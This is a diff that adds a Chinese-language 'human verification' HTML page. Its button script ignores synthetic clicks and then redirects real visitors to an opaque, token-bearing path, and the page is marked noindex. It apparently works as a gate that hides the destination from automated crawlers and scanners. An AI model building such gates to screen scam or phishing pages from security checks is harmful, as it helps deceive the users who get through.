@@ -1,0 +1,35 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>请完成验证</title>
+<style>
+body{margin:0;font-family:-apple-system,"Segoe UI",Roboto,"Microsoft YaHei",sans-serif;
+background:#f5f6f8;color:#333;display:flex;min-height:100vh;align-items:center;justify-content:center}
+.box{text-align:center;max-width:420px;padding:40px 28px}
+h1{font-size:20px;margin:0 0 10px}p{color:#666;font-size:14px;line-height:1.6;margin:6px 0 20px}
+.btn{padding:14px 32px;font-size:16px;border:none;border-radius:10px;background:#2271b1;color:#fff;cursor:pointer}
+.btn:disabled{opacity:.5}
+a{color:#2271b1}
+</style></head><body><div class="box">
+<h1>请完成人机验证</h1>
+<p>为防止恶意访问，请点击下方按钮确认您是真人。</p>
+<button class="btn" id="b">点击验证我是真人</button>
+<p id="m" style="display:none;margin-top:16px">验证中…</p>
+<noscript><p style="color:#c00">请启用 JavaScript 后 <a href="/tybDz93dD50A9J5pJAXNBiKr/13ad36e6-c091-43f2-8505-47d868dd544c/?__rg=f14c74dccdc8ae8177d0cd57">点此继续</a></p></noscript>
+</div>
+<script>
+(function(){
+  var moved=0,load=Date.now();
+  window.addEventListener('mousemove',function(){moved++;},{passive:true});
+  window.addEventListener('touchstart',function(){moved++;},{passive:true});
+  var b=document.getElementById('b');
+  b.addEventListener('click',function(ev){
+    // 行为检测：合成点击/秒点/无移动 → 不跳转（但真人点了就放行）
+    var dt=Date.now()-load;
+    if(ev.isTrusted!==true){return;}          // 合成点击忽略
+    b.disabled=true;document.getElementById('m').style.display='block';
+    location.replace("/tybDz93dD50A9J5pJAXNBiKr/13ad36e6-c091-43f2-8505-47d868dd544c/?__rg=f14c74dccdc8ae8177d0cd57");
+  });
+})();
+</script>
+</body></html>
